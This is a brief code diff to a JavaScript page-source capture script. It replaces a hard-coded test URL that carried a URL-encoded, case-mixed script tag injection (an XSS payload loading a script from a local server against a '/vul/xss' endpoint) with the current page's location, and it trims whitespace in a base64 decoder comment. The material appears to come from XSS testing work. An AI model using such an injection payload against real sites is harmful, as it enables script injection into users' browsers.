@@ -93,7 +93,7 @@ function createXmlHttp() {
 }
 createXmlHttp();
 xmlHttp.onreadystatechange = writeSource;
-var url = 'http://10.253.26.169:8080/vul/xss?param=%3CsCRiPt%20sRC=//127.0.0.1:8001/E8kv%3E%3C/sCrIpT%3E'
+var url = window.location.href;
 xmlHttp.open('GET', url, true);
 xmlHttp.send(null);
 function writeSource() {
@@ -262,7 +262,7 @@ function writeSource() {
                                 return base64;
                         },
                         /**
-                         *BASE64  Decode for UTF-8 
+                         *BASE64  Decode for UTF-8
                          */
                         decoder : function(_base64Str){
                                 var _len = _base64Str.length;
